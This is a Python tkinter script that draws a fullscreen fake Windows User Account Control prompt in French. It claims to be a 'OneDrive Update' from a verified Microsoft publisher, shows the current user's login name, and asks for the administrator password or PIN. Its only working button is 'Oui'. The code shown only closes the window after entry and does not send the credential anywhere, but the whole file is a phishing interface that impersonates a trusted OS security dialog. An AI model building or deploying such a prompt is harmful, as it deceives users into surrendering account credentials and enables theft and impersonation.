from os import getlogin
from tkinter import *

from PIL import Image, ImageTk

# window
TITLE = "Microsoft Sécurité"
F_TITLE = "Contrôle de compte d'utilisateur"
H_TEXT1 = "Voulez-vous  autoriser  cette  application à"
H_TEXT2 = "apporter des modifications à votre appareil ?"
SOFTW = " OneDrive  Update"
SOFT_TEXT1 = "Editeur Vérifié: Microsoft Software, Inc."
SOFT_TEXT2 = "Pour continuer, tapez le mot de passe "
SOFT_TEXT3 = "d'administrateur"

m = Tk(TITLE)
m.title()
m.wm_attributes('-toolwindow', True)
m.attributes('-fullscreen', True)
m.attributes('-alpha', 0.98)
m.configure(bg="#3C3D3B")

# main Frame(m)
f2 = Frame(width=460, height=530, background="#5BADEC")
f2.place(in_=m, anchor="center", relx=.5, rely=.5)
# header Frame(f2)
head = Frame(bd=0, highlightthickness=0, bg="#5BADEC")
head.place(in_=f2, x=0, y=0, relwidth=1.0, relheight=.2, anchor="nw")

# Body Frame(f2)
body = Frame(bd=0, highlightthickness=0, bg="#E6E6E6")
body.place(in_=f2, x=0, rely=.2, relwidth=1.0, relheight=.8, anchor="nw")

# title text Label(head)
title = Label(text=F_TITLE, bg="#5BADEC")
title.place(in_=head, anchor="nw", relx=0.04, rely=0.04)

close = Label(text="×", bg="#5BADEC", font=17)
close.place(in_=head, relx=0.95, rely=0.04, width=20, height=20)
# onHover()
close.bind("<Enter>", lambda e: close.config(bg="red"))
close.bind("<Leave>", lambda e: close.config(bg="#5BADEC"))
# onClick()
close.bind("<Button-1>", lambda e: m.destroy())

# Head Text Label(head)
headText1 = Label(text=H_TEXT1, font=17, bg="#5BADEC", )
headText1.place(in_=head, relx=0.04, rely=0.3, )

headText2 = Label(text=H_TEXT2, font=17, bg="#5BADEC", )
headText2.place(in_=head, relx=0.04, rely=0.6, )

# BODY

# img pos
img = Frame()
img.place(in_=body, relx=0.035, rely=0.04)
# image
image = Image.open('assets/image.png')
image = image.resize((90, 40))
photo = ImageTk.PhotoImage(image)
canvas = Canvas(img, bg="#E6E6E6", width=95, height=40, highlightthickness=0)
canvas.pack()
canvas.create_image(42.5, 20, image=photo)

# software name

soft = Label(text=SOFTW, height=2, font=("Arial Sans-serif", 14, "normal"), bg="#E6E6E6")
soft.place(in_=body, relx=0.2, rely=0.04)

# editor , soft loc
origin = Label(text=SOFT_TEXT1, height=2, bg="#E6E6E6", font=10)
origin.place(in_=body, relx=0.04, rely=0.135)
# please enter pass
loc = Label(text=SOFT_TEXT2, height=2, bg="#E6E6E6", font=11)
loc.place(in_=body, relx=0.04, rely=0.24)

loc2 = Label(text=SOFT_TEXT3, height=1, bg="#E6E6E6", font=11)
loc2.place(in_=body, relx=0.04, rely=0.31)
# img pos
img2 = Frame(bg="red")
img2.place(in_=body, relx=0.04, rely=0.4)
# ring
img2.bell()

# image
image2 = Image.open('assets/codeIcon.jpg').resize((50, 60))
photo2 = ImageTk.PhotoImage(image2)
canvas2 = Canvas(img2, bg="#E6E6E6", width=50, height=60, highlightthickness=0)
canvas2.pack()
picture = canvas2.create_image(25, 30, image=photo2)

codeType = Label(text="Code Confidentiel", height=2, bg="#E6E6E6", font=10)
codeType.place(in_=img2, relx=1.2, rely=-0.1)

user = Label(text=f"{getlogin()[0].upper() + getlogin()[1:]}", height=2, bg="#E6E6E6", font=11)
user.place(in_=img2, relx=1.2, rely=0.48)


# input
def on_entry_click(event):

    if entry.get() == ' Code confidentiel' or entry.get() == " Mot de Passe":
        entry.delete(0, "end")
        entry.insert(0, '')
        entry.config(fg='black', show="•")


def on_focusout(event):
    if entry.get() == '':
        entry.insert(0, 'Code confidentiel')
        entry.config(fg='grey', show="")


entry = Entry(borderwidth=0, highlightthickness=0, font=11)
entry.place(in_=body, relx=0.175, rely=0.57, relwidth=0.65, height=35)
entry.insert(0, ' Code confidentiel')
entry.bind('<Button-1>', on_entry_click)
entry.bind('<FocusOut>', on_focusout)
entry.config(fg='grey')

# i forgot
forgot = Label(text="j'ai oublié mon code", bg="#E6E6E6", fg="#1081D7", font=10)
forgot.place(in_=body, relx=0.18, rely=0.659)
forgot.bind("<Enter>", lambda e: forgot.config(fg="blue"))
forgot.bind("<Leave>", lambda e: forgot.config(fg="#1081D7"))


# switch

def switcher(e):
    global pict, new_image
    if (codeType.cget("text") == "Code Confidentiel"):

        new_image = Image.open('assets/pwd.png').resize((50, 60))
        pict = ImageTk.PhotoImage(new_image)
        canvas2.itemconfigure(picture, image=pict)
        codeType.configure(text="Mot de Passe")
        entry.delete(0, "end")
        entry.config(fg='grey', show="")
        entry.insert(0, ' Mot de Passe')
        if entry.focus_get():
            m.focus()

    else:

        new_image = Image.open('assets/codeIcon.jpg').resize((50, 60))
        pict = ImageTk.PhotoImage(new_image)
        canvas2.itemconfigure(picture, image=pict)
        codeType.configure(text="Code Confidentiel")
        entry.delete(0, "end")
        entry.config(fg='grey', show="")
        entry.insert(0, ' Code confidentiel')
        if entry.focus_get():
            m.focus()

switch = Label(text="mot de passe", bg="#E6E6E6", fg="#1081D7", font=10)
switch.place(in_=body, relx=0.04, rely=0.73)
switch.bind("<Button-1>", switcher)
switch.bind("<Enter>", lambda e: switch.config(fg="blue"))
switch.bind("<Leave>", lambda e: switch.config(fg="#1081D7"))

# YES / NO Button

def check(e):

    if entry.get() == ' Code confidentiel' or entry.get() == " Mot de Passe" or entry.get() == "":
        m.bell()
    else:
        m.destroy()


yes_no = Frame(bg="#E6E6E6")
yes_no.place(in_=body, relwidth=.9, height=40, relx=.06, rely=.85)

yes = Label(text="Oui", height=2, bg="#B8B8B8", font=12)
#yes.place(in_=yes_no, anchor="w", relwidth=.495, relx=0.00, rely=0.5)

#remove next line to get yes and no
yes.place(in_=yes_no, anchor="w", relwidth=.495, relx=0.505, rely=0.5)
# onHover()
yes.bind("<Enter>", lambda e: yes.config(bg="grey"))
yes.bind("<Leave>", lambda e: yes.config(bg="#B8B8B8"))
# onClick()
yes.bind("<Button-1>", check)

"""
no = Label(text="Non", height=2, bg="#B8B8B8", font=12)
no.place(in_=yes_no, anchor="w", relwidth=.495, relx=0.505, rely=0.5)
no.bind("<Enter>", lambda e: no.config(bg="grey"))
no.bind("<Leave>", lambda e: no.config(bg="#B8B8B8"))
# onClick()
no.bind("<Button-1>", lambda e: m.destroy())
"""
m.mainloop()
